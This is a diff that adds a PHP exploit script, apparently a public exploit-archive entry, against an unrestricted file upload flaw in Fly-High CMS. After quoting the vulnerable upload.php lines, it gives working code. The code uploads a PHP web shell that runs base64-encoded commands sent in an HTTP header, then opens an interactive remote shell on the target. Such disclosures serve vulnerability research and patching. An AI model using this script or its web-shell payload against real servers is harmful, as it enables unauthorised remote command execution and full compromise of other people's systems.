@@ -1,0 +1,117 @@
+<?php
+ 
+/*
+ 
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /        
+  / XXXXXX /
+ (________(          
+  `------'
+  
+ Exploit Title   : Fly-High CMS Unrestricted File Upload Exploit
+ Date            : 15 June 2013
+ Exploit Author  : CWH Underground
+ Site            : www.2600.in.th
+ Vendor Homepage : http://sourceforge.net/projects/flyhighcms/
+ Software Link   : http://jaist.dl.sourceforge.net/project/flyhighcms/unstable/2012-07-08_unstable.zip
+ Version         : 2012-07-08
+ Tested on       : Window and Linux
+  
+  
+#####################################################
+VULNERABILITY: Unrestricted File Upload 
+#####################################################
+  
+/resources/upload.php (LINE: 30, 60-61)
+ 
+-----------------------------------------------------------------------------
+Line: 30 
+$targetDir = "../" . $_GET['pfad'];
+-----------------------------------------------------------------------------
+
+-----------------------------------------------------------------------------
+Line: 60-61
+if (!file_exists($targetDir))
+		@mkdir($targetDir);
+-----------------------------------------------------------------------------
+
+-----------------------------------------------------------------------------
+Line: 55-57
+$fileName = 'upload_' . $count . $fileName_b;
+
+$filePath = $targetDir . DIRECTORY_SEPARATOR . $fileName;
+-----------------------------------------------------------------------------
+ 
+#####################################################
+DESCRIPTION
+#####################################################
+  
+An attacker might write to arbitrary files or inject arbitrary code into a file with this vulnerability.
+User tainted data is used when creating the file name that will be opened or when creating the string that will be written to the file.
+An attacker can try to write arbitrary PHP code in a PHP file allowing to fully compromise the server.
+ 
+
+#####################################################
+EXPLOIT
+#####################################################
+  
+*/
+ 
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+ 
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die("\n[-] No response from {$host}:80\n");
+  
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+ 
+print "\n+----------------------------------------------+";
+print "\n| Fly-High CMS Unrestricted File Upload Exploit |";
+print "\n+----------------------------------------------+\n";
+  
+if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /flyhighCMS/\n";
+    die();
+}
+ 
+$host = $argv[1];
+$path = $argv[2];
+ 
+
+$payload = "<?php error_reporting(0); print(___); passthru(base64_decode(\$_SERVER[HTTP_CMD]));\r\n";
+ 
+$packet  = "POST {$path}resources/upload.php?pfad=cwh&name=1.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+     
+http_send($host, $packet);
+ 
+$packet1  = "GET {$path}cwh/upload_1.php HTTP/1.0\r\n";
+$packet1 .= "Host: {$host}\r\n";
+$packet1 .= "Cmd: %s\r\n";
+$packet1 .= "Connection: close\r\n\r\n";
+     
+while(1)
+{
+    print "\nFlyhigh-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    $response = http_send($host, sprintf($packet1, base64_encode($cmd)));
+    preg_match('/___(.*)/s', $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
+}
+ 
+?>
